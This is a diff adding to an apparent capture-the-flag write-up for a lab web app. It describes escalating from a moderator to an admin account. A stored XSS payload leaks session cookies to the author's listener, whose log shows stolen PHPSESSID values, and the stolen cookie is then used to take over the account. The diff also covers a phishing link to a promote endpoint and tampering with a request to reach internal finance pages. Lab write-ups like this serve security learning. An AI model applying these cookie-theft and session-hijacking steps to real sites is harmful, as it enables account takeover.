@@ -304,5 +304,44 @@ Keyboard interrupt received, exiting.
 </html>
 ```
 
-*** It definitely worked!! The response is totally different, which means I can send this request using burpsuite, and open the request on the browser.
+### It definitely worked!! The response is totally different, which means I can send this request using burpsuite, and open the request on the browser.
+
+---
+
+## Privilege Escalation to Admin Account
+
+> So I've taken over the mod account, but we need the admin account.
+
+![image](Images/Screenshot%20From%202026-07-11%2013-32-01.png)
+
+> Then I found this chatroom, where I can send messages to admin. Maybe I can try using the same trick to send myself the admin cookies? But I noticed some words like 'script' were blacklisted so I started trying some bypasses on this, like using <img> tag instead of <script>. No matter what I tried, nothing worked, since everything was sanitized well. Then I tried phishing the admin to click a link I created to promote myself to Co-Admin, since there was a setting like this, but only for admins. 'http://10.130.163.54/promote_coadmin.php?username=mod' But it did not work either. Then I made the admin click the link where mod and admins can review feedbacks which contained my stored XSS payload. We could make admin fall for the same trick indirectly. I sent him the link: http://review.thm/admin_view.php, and started receiving his session_id. I sent the same payload as mod, but changed the port to 9000.
+
+```
+┌──(root㉿kali)-[~]
+└─# python3 -m http.server 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+10.130.163.54 - - [11/Jul/2026 06:00:31] code 404, message File not found
+10.130.163.54 - - [11/Jul/2026 06:00:31] "GET /a.jpgPHPSESSID%3Dko0bat5sgu5mvsjv6af0tdfrub HTTP/1.1" 404 -
+10.130.163.54 - - [11/Jul/2026 06:00:34] code 404, message File not found
+10.130.163.54 - - [11/Jul/2026 06:00:34] "GET /a.jpgPHPSESSID%3Dko0bat5sgu5mvsjv6af0tdfrub HTTP/1.1" 404 -
+10.130.163.54 - - [11/Jul/2026 06:00:36] code 404, message File not found
+10.130.163.54 - - [11/Jul/2026 06:00:56] "GET /a.jpgPHPSESSID%3D5j60rs0h8r7k6gr7g6k6a82gkn HTTP/1.1" 404 -
+10.130.163.54 - - [11/Jul/2026 06:00:56] code 404, message File not found
+```
+
+### FOUND: PHPSESSID=5j60rs0h8r7k6gr7g6k6a82gkn. I changed my cookie value and pwned admin account!!
+
+## Access to restricted segments: Finance
+
+> Now that I compromised the Admin's account, I encountered this page with a new feature. We already know the `/lottery.php` and `/finance.php` endpoints from /mail/dump.txt, but we were told they are only accessible internally. 
+
+![image](Images/Screenshot%20From%202026-07-11%2014-06-22.png)
+
+> But when I selected lottery feature, I could not help but notice that a new request was being made by browser. That alone is very sus, because normally, these changes are made only in front-end. Why there was a need to make a new request for feature change? So I opened burpsuite, and confirmed my doubts.
+
+![image](Images/Screenshot%20From%202026-07-11%2014-10-18.png)
+
+### Why does it send lottery.php? And what would happen if I changed it to finance.php...?
+
+![image](Images/Screenshot%20From%202026-07-11%2014-10-35.png)
 
